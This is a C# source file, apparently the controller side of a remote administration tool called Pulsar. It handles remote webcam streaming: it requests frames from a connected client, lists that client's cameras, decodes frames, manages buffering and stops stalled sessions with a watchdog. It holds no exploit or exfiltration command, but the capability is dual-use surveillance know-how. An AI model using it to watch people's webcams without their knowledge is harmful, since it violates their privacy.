using Pulsar.Common.Enums;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Messages.Webcam;
using Pulsar.Common.Networking;
using Pulsar.Common.Video.Codecs;
using Pulsar.Server.Networking;
using System;
using System.Collections.Concurrent;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Threading.Tasks;

namespace Pulsar.Server.Messages
{
    /// <summary>
    /// Handles messages for the interaction with the remote webcam.
    /// </summary>
    public class RemoteWebcamHandler : MessageProcessorBase<Bitmap>, IDisposable
    {
        /// <summary>
        /// States if the client is currently streaming webcam frames.
        /// </summary>
        public bool IsStarted { get; set; }

        /// <summary>
        /// Gets or sets whether the remote webcam is using buffered mode.
        /// </summary>
        public bool IsBufferedMode { get; set; } = true;

        /// <summary>
        /// Used in lock statements to synchronize access to <see cref="_codec"/> between UI thread and thread pool.
        /// </summary>
        private readonly object _syncLock = new object();

        /// <summary>
        /// Used in lock statements to synchronize access to <see cref="LocalResolution"/> between UI thread and thread pool.
        /// </summary>
        private readonly object _sizeLock = new object();

        /// <summary>
        /// The local resolution, see <seealso cref="LocalResolution"/>.
        /// </summary>
        private Size _localResolution;

        /// <summary>
        /// The local resolution in width x height. It indicates to which resolution the received frame should be resized.
        /// </summary>
        /// <remarks>
        /// This property is thread-safe.
        /// </remarks>
        public Size LocalResolution
        {
            get
            {
                lock (_sizeLock)
                {
                    return _localResolution;
                }
            }
            set
            {
                lock (_sizeLock)
                {
                    _localResolution = value;
                }
            }
        }

        /// <summary>
        /// Represents the method that will handle display changes.
        /// </summary>
        /// <param name="sender">The message processor which raised the event.</param>
        /// <param name="value">All currently available displays.</param>
        public delegate void DisplaysChangedEventHandler(object sender, string[] value);

        /// <summary>
        /// Raised when a display changed.
        /// </summary>
        /// <remarks>
        /// Handlers registered with this event will be invoked on the 
        /// <see cref="System.Threading.SynchronizationContext"/> chosen when the instance was constructed.
        /// </remarks>
        public event DisplaysChangedEventHandler DisplaysChanged;

        public event EventHandler<MediaStreamStatusEventArgs> StreamStatusChanged;

        public sealed class MediaStreamStatusEventArgs : EventArgs
        {
            public MediaStreamStatus Status { get; }
            public string ErrorCode { get; }
            public string ErrorMessage { get; }

            public MediaStreamStatusEventArgs(MediaStreamStatus status, string errorCode, string errorMessage)
            {
                Status = status;
                ErrorCode = errorCode;
                ErrorMessage = errorMessage;
            }
        }

        /// <summary>
        /// Reports changed displays.
        /// </summary>
        /// <param name="value">All currently available displays.</param>
        private void OnDisplaysChanged(string[] value)
        {
            SynchronizationContext.Post(val =>
            {
                var handler = DisplaysChanged;
                handler?.Invoke(this, (string[])val);
            }, value);
        }

        private void OnStreamStatusChanged(MediaStreamStatus status, string errorCode, string errorMessage)
        {
            var handler = StreamStatusChanged;
            if (handler == null)
                return;

            SynchronizationContext.Post(_ =>
            {
                handler?.Invoke(this, new MediaStreamStatusEventArgs(status, errorCode, errorMessage));
            }, null);
        }

        /// <summary>
        /// The client which is associated with this remote webcam handler.
        /// </summary>
        private readonly Client _client;

        /// <summary>
        /// The video stream codec used to decode received frames.
        /// </summary>
        private UnsafeStreamCodec _codec;

        // buffer parameters
        private readonly int _initialFramesRequested = 5; // request 5 frames initially
        private readonly int _defaultFrameRequestBatch = 3; // request 3 frames at a time now on
        private int _pendingFrames = 0;
        private readonly SemaphoreSlim _frameRequestSemaphore = new SemaphoreSlim(1, 1);
        private readonly Stopwatch _frameReceiptStopwatch = new Stopwatch();        private readonly ConcurrentQueue<long> _frameTimestamps = new ConcurrentQueue<long>();
        private readonly int _fpsCalculationWindow = 10; // calculate FPS based on last 10 frames

        private readonly Stopwatch _performanceMonitor = new Stopwatch();
        private int _framesReceived = 0;
        private double _estimatedFps = 0;
        private string _sessionId;
        private long _lastSequence = 0;
        private bool _wasActiveStatusReported;
        private long _lastFrameTimestamp;
        public long LastFrameTimestamp => Interlocked.Read(ref _lastFrameTimestamp);

        private long _accumulatedFrameBytes = 0;
        private int _frameBytesSamples = 0;
        private long _lastFrameBytes = 0;
        private Timer _watchdogTimer;
        private bool _disposed;
        private readonly object _watchdogLock = new object();

        public long LastFrameSizeBytes => Interlocked.Read(ref _lastFrameBytes);
        public double AverageFrameSizeBytes
        {
            get
            {
                long total = Interlocked.Read(ref _accumulatedFrameBytes);
                int count = Volatile.Read(ref _frameBytesSamples);
                return count > 0 ? (double)total / count : 0.0;
            }
        }

        /// <summary>
        /// Stores the last FPS reported by the client.
        /// </summary>
        private float _lastReportedFps = -1f;

        /// <summary>
        /// Shows the last FPS reported by the client, or estimated FPS if not available.
        /// </summary>
        public float CurrentFps => _lastReportedFps > 0 ? _lastReportedFps : (float)_estimatedFps;

        /// <summary>
        /// Initializes a new instance of the <see cref="RemoteWebcamHandler"/> class using the given client.
        /// </summary>
        /// <param name="client">The associated client.</param>
        public RemoteWebcamHandler(Client client) : base(true)
        {
            _client = client;
            _performanceMonitor.Start();
        }

        /// <inheritdoc />
        public override bool CanExecute(IMessage message) => message is GetWebcamResponse || message is GetAvailableWebcamsResponse;

        /// <inheritdoc />
        public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);

        /// <inheritdoc />
        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetWebcamResponse frame:
                    Execute(sender, frame);
                    break;
                case GetAvailableWebcamsResponse m:
                    Execute(sender, m);
                    break;
            }
        }

        private void ClearTimeStamps()
        {
            while (_frameTimestamps.TryDequeue(out _)) { }
        }

        /// <summary>
        /// Begins receiving frames from the client using the specified quality and display.
        /// </summary>
        /// <param name="quality">The quality of the remote webcam frames.</param>
        /// <param name="display">The display to receive frames from.</param>
        public void BeginReceiveFrames(int quality, int display)
        {
            StopWatchdog();
            lock (_syncLock)
            {
                if (_disposed)
                    return;

                IsStarted = true;
                _sessionId = Guid.NewGuid().ToString("N");
                Interlocked.Exchange(ref _lastSequence, 0);
                _wasActiveStatusReported = false;
                _lastReportedFps = -1f;
                _estimatedFps = 0;
                Interlocked.Exchange(ref _lastFrameTimestamp, 0);
                Interlocked.Exchange(ref _lastFrameBytes, 0);
                Interlocked.Exchange(ref _accumulatedFrameBytes, 0);
                Interlocked.Exchange(ref _frameBytesSamples, 0);
                _codec?.Dispose();
                _codec = null;

                // Reset buffering counters
                _pendingFrames = _initialFramesRequested;
                ClearTimeStamps();
                _framesReceived = 0;
                _frameReceiptStopwatch.Restart();
                _performanceMonitor.Restart();
                StartWatchdog();

                // Start in buffered mode
                _client.Send(new GetWebcam
                {
                    CreateNew = true,
                    Quality = quality,
                    DisplayIndex = display,
                    Status = RemoteWebcamStatus.Start,
                    IsBufferedMode = IsBufferedMode,
                    FramesRequested = _initialFramesRequested,
                    SessionId = _sessionId
                });
            }
        }

        /// <summary>
        /// Ends receiving frames from the client.
        /// </summary>
        public void EndReceiveFrames()
        {
            string sessionId;
            lock (_syncLock)
            {
                IsStarted = false;
                sessionId = _sessionId;
                StopWatchdog();
            }

            Debug.WriteLine("Remote webcam session stopped");

            _client.Send(new GetWebcam
            {
                Status = RemoteWebcamStatus.Stop,
                SessionId = sessionId
            });
        }

        /// <summary>
        /// Refreshes the available displays of the client.
        /// </summary>
        public void RefreshDisplays()
        {
            Debug.WriteLine("Refreshing displays");
            _client.Send(new GetAvailableWebcams());
        }                private void Execute(ISender client, GetWebcamResponse message)
        {
            if (_disposed)
                return;

            if (!string.IsNullOrWhiteSpace(_sessionId) &&
                !string.Equals(_sessionId, message.SessionId, StringComparison.Ordinal))
            {
                Debug.WriteLine("Ignoring stale webcam session response.");
                return;
            }
            if (string.IsNullOrWhiteSpace(_sessionId) && !string.IsNullOrWhiteSpace(message.SessionId))
            {
                Debug.WriteLine("Ignoring webcam response without an active session.");
                return;
            }

            if (message.Status != MediaStreamStatus.Active)
            {
                lock (_syncLock)
                {
                    IsStarted = false;
                    StopWatchdog();
                    _sessionId = null;
                }
                OnStreamStatusChanged(message.Status, message.ErrorCode, message.ErrorMessage);

                if (!string.IsNullOrWhiteSpace(message.ErrorMessage))
                {
                    Debug.WriteLine($"Webcam stream error: {message.ErrorCode}: {message.ErrorMessage}");
                }
                return;
            }

            if (message.Sequence > 0 &&
                Interlocked.Read(ref _lastSequence) >= message.Sequence)
            {
                Debug.WriteLine("Ignoring duplicate or stale webcam frame.");
                return;
            }
            if (message.Sequence > 0)
            {
                Interlocked.Exchange(ref _lastSequence, message.Sequence);
            }
            ResetWatchdog();
            if (!_wasActiveStatusReported)
            {
                _wasActiveStatusReported = true;
                OnStreamStatusChanged(MediaStreamStatus.Active, null, null);
            }
            _framesReceived++;

            // Capture client-reported FPS if available
            if (message.FrameRate > 0)
            {
                _lastReportedFps = message.FrameRate;
            }

            if (_performanceMonitor.ElapsedMilliseconds >= 1000)
            {
                _estimatedFps = _framesReceived / (_performanceMonitor.ElapsedMilliseconds / 1000.0);
                Debug.WriteLine($"Client FPS: {_lastReportedFps:F1}, Estimated FPS: {_estimatedFps:F1}, Frames received: {_framesReceived}");
                _framesReceived = 0;
                _performanceMonitor.Restart();
            }

            lock (_syncLock)
            {
                if (!IsStarted)
                    return;
                if (message.Image == null || message.Image.Length == 0)
                {
                    Debug.WriteLine("Ignoring webcam frame with no image payload.");
                    return;
                }
                if (message.Image.Length > 16 * 1024 * 1024)
                {
                    Debug.WriteLine("Ignoring oversized webcam frame.");
                    return;
                }

                if (_codec == null || _codec.ImageQuality != message.Quality || _codec.Monitor != message.Monitor || _codec.Resolution != message.Resolution)
                {
                    _codec?.Dispose();
                    _codec = new UnsafeStreamCodec(message.Quality, message.Monitor, message.Resolution);
                }

                if (message.Image != null)
                {
                    long size = message.Image.LongLength;
                    Interlocked.Exchange(ref _lastFrameBytes, size);
                    Interlocked.Add(ref _accumulatedFrameBytes, size);
                    Interlocked.Increment(ref _frameBytesSamples);
                }

                using (var ms = new MemoryStream(message.Image))
                {
                    try
                    {
                        var decoded = _codec.DecodeData(ms);
                        if (decoded != null)
                        {
                            EnsureLocalResolutionInitialized(decoded.Size);

                            // PASS THE DECODED FRAME DIRECTLY TO UI
                            OnReport(decoded); // do not clone or dispose decoded
                        }
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine($"Error decoding frame: {ex.Message}");
                    }
                }


                message.Image = null;

                long timestamp = message.Timestamp > 0
                    ? message.Timestamp
                    : DateTimeOffset.UtcNow.ToUnixTimeMilliseconds();
                Interlocked.Exchange(ref _lastFrameTimestamp, timestamp);
                _frameTimestamps.Enqueue(Stopwatch.GetTimestamp());
                while (_frameTimestamps.Count > _fpsCalculationWindow && _frameTimestamps.TryDequeue(out _)) { }

                if (Interlocked.CompareExchange(ref _pendingFrames, 0, 0) > 0)
                {
                    Interlocked.Decrement(ref _pendingFrames);
                }
            }

            if (IsBufferedMode && (message.IsLastRequestedFrame || _pendingFrames <= 1))
            {
                RequestMoreFrames();
            }
        }

        private void EnsureLocalResolutionInitialized(Size fallbackSize)
        {
            if (fallbackSize.Width <= 0 || fallbackSize.Height <= 0)
            {
                return;
            }

            var current = LocalResolution;
            if (current.Width <= 0 || current.Height <= 0)
            {
                LocalResolution = fallbackSize;
            }
        }

        private void RequestMoreFrames()
        {
            if (_disposed)
                return;

            bool acquired;
            try
            {
                acquired = _frameRequestSemaphore.Wait(0);
            }
            catch (ObjectDisposedException)
            {
                return;
            }
            if (!acquired)
                return;

            try
            {
                lock (_syncLock)
                {
                    if (!IsStarted || string.IsNullOrWhiteSpace(_sessionId))
                        return;
                }

                int batchSize = _defaultFrameRequestBatch;

                if (_estimatedFps > 25)
                    batchSize = 5;
                else if (_estimatedFps < 10)
                    batchSize = 2;
                batchSize = Math.Max(1, Math.Min(batchSize, 12));

                Debug.WriteLine($"Requesting {batchSize} more frames");
                int pending = Interlocked.Add(ref _pendingFrames, batchSize);
                if (pending > 30)
                {
                    Interlocked.Exchange(ref _pendingFrames, 30);
                }

                _client.Send(new GetWebcam
                {
                    CreateNew = false,
                    Quality = _codec?.ImageQuality ?? 75,
                    DisplayIndex = _codec?.Monitor ?? 0,
                    Status = RemoteWebcamStatus.Continue,
                    IsBufferedMode = true,
                    FramesRequested = batchSize,
                    SessionId = _sessionId
                });
            }
            finally
            {
                try
                {
                    _frameRequestSemaphore.Release();
                }
                catch (ObjectDisposedException)
                {
                }
            }
        }

        private void Execute(ISender client, GetAvailableWebcamsResponse message)
        {
            OnDisplaysChanged(message.Webcams);
        }

        private void StartWatchdog()
        {
            lock (_watchdogLock)
            {
                _watchdogTimer?.Dispose();
                _watchdogTimer = new Timer(OnWebcamWatchdog, null, 5000, 5000);
            }
        }

        private void ResetWatchdog()
        {
            lock (_watchdogLock)
            {
                if (_watchdogTimer != null)
                    _watchdogTimer.Change(5000, 5000);
            }
        }

        private void StopWatchdog()
        {
            lock (_watchdogLock)
            {
                if (_watchdogTimer != null)
                {
                    _watchdogTimer.Dispose();
                    _watchdogTimer = null;
                }
            }
        }

        private void OnWebcamWatchdog(object state)
        {
            lock (_watchdogLock)
            {
                if (_disposed)
                    return;
            }

            string sessionId;
            lock (_syncLock)
            {
                if (!IsStarted)
                {
                    StopWatchdog();
                    return;
                }
                sessionId = _sessionId;
                IsStarted = false;
                _sessionId = null;
            }

            try
            {
                _client.Send(new GetWebcam
                {
                    Status = RemoteWebcamStatus.Stop,
                    SessionId = sessionId
                });
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error sending webcam watchdog stop: {ex.Message}");
            }
            StopWatchdog();
            OnStreamStatusChanged(MediaStreamStatus.Error,
                "WEBCAM_FRAME_TIMEOUT",
                "The webcam stream stopped responding.");
        }

        /// <summary>
        /// Disposes all managed and unmanaged resources associated with this message processor.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                _disposed = true;
                StopWatchdog();
                lock (_syncLock)
                {
                    _codec?.Dispose();
                    IsStarted = false;
                    _sessionId = null;
                }
                _frameRequestSemaphore?.Dispose();
            }
        }
    }
}
